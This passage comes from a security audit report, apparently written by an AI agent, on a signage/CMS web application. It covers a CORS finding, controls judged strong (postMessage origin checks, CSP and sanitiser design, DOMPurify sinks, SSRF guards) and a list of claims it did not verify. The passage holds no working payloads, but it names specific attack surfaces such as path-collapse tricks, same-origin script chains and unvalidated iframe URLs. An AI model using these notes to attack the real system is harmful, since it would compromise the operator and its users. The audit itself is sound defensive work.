Every origin is approved for every method and every requested header, short-circuiting `ALLOWED_ORIGINS` at the edge. Largely inert — the browser still requires the **actual** response to carry a matching `Access-Control-Allow-Origin`, which the API sets from its own allowlist — but it removes a layer and it will mislead anyone reading the CORS posture. Mirror `ALLOWED_ORIGINS` into a worker var and echo only listed origins. Fix before cutover.

---

## What's already strong

- **The `educms-action` gate is genuinely closed.** `player/page.tsx:6092-6109` rejects any message whose `event.source` is not a frame we mounted (`lookupKioskFrame(e.source)` against a `WeakMap` keyed on `contentWindow` — `kiosk-frame-registry.ts:30`, `:53-56`), and then **ignores the `action` object in the message**, resolving `d.key` against the operator-saved map instead (`:6099-6100`). Exactly one call site, exactly one producer (`WidgetRenderer.tsx:3951`). I tried to break it: an unwired frame registers `{}`, which is truthy and passes the `if (!savedActions)` guard at `:6097` — but the per-key lookup at `:6099` then returns `undefined` and `:6100` returns. Holds.
- **`HolidayWidget.tsx:187-289` is the reference implementation** — `event.source` checked *unconditionally* (`:200-201`, with an in-code note that the old `if (iframeRef.current && …)` form skipped the check whenever the ref was null), `event.origin` allowlisted to `"null"` or own origin (`:209`), and outbound posts pinned to `HOLIDAY_FRAME_TARGET_ORIGIN` rather than `'*'`.
- **The spatial-nav shim is well-built on both halves.** Server side (`spatial-nav-shim.ts:257-273`): `e.source!==window.parent`, `PARENTS.indexOf(e.origin)===-1`, a fixed namespace, and a closed command enum with no payload — the allowlist is baked from `ALLOWED_ORIGINS` server-side and provably cannot be widened by the request (`proxy.controller.spec.ts:76-89` tests exactly that). Parent side (`webpage-spatial-nav.ts:188-204`): `result` is deliberately inert and `ready` only re-arms.
- **`buildSafeDesignerSrcdoc` is the strongest containment in the codebase.** Scripts stripped unless SHA-256-pinned against a registry of every historically shipped body (`designer-safe-srcdoc.ts:74-93`) — the `INJ-004` "one comment turns the sanitiser into a nonce-signing oracle" bug is fixed by anchoring trust to structure + hash, not substring (`:35-62`) — plus a fresh-nonce CSP with `default-src 'none'; script-src 'nonce-…'; form-action 'none'; base-uri 'none'; frame-src 'none'` (`:328-336`), `<base>`/nested-frame/`javascript:`/meta-refresh strips (`:319-324`), and a looped inline-handler strip (`:285-296`) that the CSP makes redundant anyway.
- **Dashboard XSS is clean.** All 5 real sinks outside player/widget paths pass through DOMPurify at the sink: `Sidebar.tsx:425` ← `:170-175`; `BrandingWizard.tsx:1189` ← `:46-52`; `BrandingLivePreview.tsx:143` ← `:28-53`; `BrandingSettingsCard.tsx:503` ← `:85-94`; `announcements/page.tsx:221` ← `:72` (and again at the zod boundary, `:19`). Zero `.innerHTML`/`outerHTML` assignments outside `components/widgets/`; zero `insertAdjacentHTML`; zero `document.write`; the only production `new Function(` is a dynamic-import trampoline for hls.js.
- **The renderer's SSRF guard is wired, contrary to the brief's suspicion.** `renderer.service.ts:123` really does `await assertPublicUrl(url)` before `getBrowser()`, and sub-requests really are intercepted and checked (`:148-172`). `file://` is blocked in both halves (`safe-fetch.ts:26`, `:67-70`), non-80/443 ports are blocked (`:72-73`), and `media`/`websocket`/`eventsource` are aborted outright. RS-02 is a gap in the *depth* of that guard, not its absence.
- **`safeFetch` itself is exemplary** — up-front validate, DNS-resolve-and-check, plus a connect-time `lookup` pin that closes the rebind TOCTOU (`safe-fetch.ts:122-145`), manual redirect handling capped at 3 (`:272`, `:349-353`), and a streaming byte cap.
- **The proxy error page already HTML-escapes** before interpolation (`proxy.controller.ts:670-677`) — RS-03 is an information-disclosure issue, not an XSS one.

---

## Not checked / UNVERIFIED

- **Runtime confirmation that SSR is live.** RS-02/04/05 all assume `puppeteer.launch` succeeds at `/usr/bin/chromium-browser` on this Alpine image. Untested — one `curl` settles it (see the RS-02 caveat). If SSR is dead, those three are latent, not live.
- **The `%2e%2e` collapse in RS-07** is asserted from the WHATWG URL spec, not measured. One `node -e` proves or disproves it.
- **Puppeteer's redirect/interception semantics** were not empirically tested. RS-02's argument is deliberately constructed to hold either way.
- **The 193 board HTML files were not individually audited.** I read the injected V7/V6/kiosk runtimes in full and the injector that bakes them, but not each board's own hand-written JS. A board that reads a URL param into an `innerHTML` sink would be invisible to this pass — worth one targeted sweep of `public/templates/**` for `innerHTML`/`document.write`/`location.search` combinations.
- **The asset upload MIME/approval gate** behind RS-12 was not re-traced; I relied on `03-CONTENT-INJECTION.md:66-68`.
- **localStorage key names in RS-01 step 6** are second-hand from `03-CONTENT-INJECTION.md:30`, not re-read by me. The chain does not depend on the exact names — only on same-origin script execution, which is established independently.
- **`url-transforms.ts:101-105` (`extractIframeSrc`)** pulls a URL out of an operator-pasted `<iframe>` snippet with a regex and no scheme validation *at that layer*. Its consumers were not traced. Flagged for a follow-up, not claimed as a finding.
- **`FitnessLiveTVWidget.tsx:249`** uses `new Function(` as a dynamic-import trampoline. It sits in `components/widgets/`, which belongs to another agent's surface and was in-flight during this audit — flagged, not audited.
- **No dynamic testing of any kind.** No requests were sent to production or staging; every claim is static-analysis over source read at `a74c7894`/`cec023ec`.
